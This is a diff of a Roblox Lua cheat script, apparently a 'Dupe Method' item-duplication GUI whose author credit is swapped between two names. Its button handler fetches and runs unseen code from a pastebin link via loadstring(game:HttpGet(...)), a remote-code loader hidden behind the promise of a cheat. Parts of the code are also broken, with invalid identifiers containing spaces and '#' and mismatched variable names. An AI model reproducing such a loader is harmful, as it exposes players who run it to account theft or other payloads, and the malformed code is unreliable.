@@ -1,6 +1,6 @@
 local ScreenGui = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
-local DupeMethodMadeByShаdow#1427 = Instance.new("TextLabel")
+local DupeMethodMadeByPr4ston = Instance.new("TextLabel")
 local _10Minutes = Instance.new("TextButton")
 local _20Minutes = Instance.new("TextButton")
 local _30Minutes = Instance.new("TextButton")
@@ -27,15 +27,15 @@ DupedMethodMadeByPr4ston.Text = "Dupe Method | Made By Shаdow#1427"
 DupedMethodMadeByPr4ston.TextColor3 = Color3.fromRGB(15, 15, 15)
 DupedMethodMadeByPr4ston.TextSize = 22.000
 
-Start Dupe.Name = "Start Dupe"
-Start Dupe.Parent = main
-Start Dupe.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
-Start Dupe.Position = UDim2.new(0.115384616, 0, 0.330769241, 0)
-Start Dupe.Size = UDim2.new(0, 200, 0, 136)
-Start Dupe.Font = Enum.Font.SourceSans
-Start Dupe.Text = "Start Dupe"
-Start Dupe.TextColor3 = Color3.fromRGB(15, 15, 15)
-Start Dupe.TextSize = 47.000
-Start Dupe.MouseButton1Down:connect(function()
+_30Minutes.Name = "30 Minutes"
+_30Minutes.Parent = main
+_30Minutes.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
+_30Minutes.Position = UDim2.new(0.115384616, 0, 0.330769241, 0)
+_30Minutes.Size = UDim2.new(0, 200, 0, 136)
+_30Minutes.Font = Enum.Font.SourceSans
+_30Minutes.Text = "Start Dupe"
+_30Minutes.TextColor3 = Color3.fromRGB(15, 15, 15)
+_30Minutes.TextSize = 47.000
+_30Minutes.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet('https://pastebin.com/Tmb7NGFE'))()
 end)
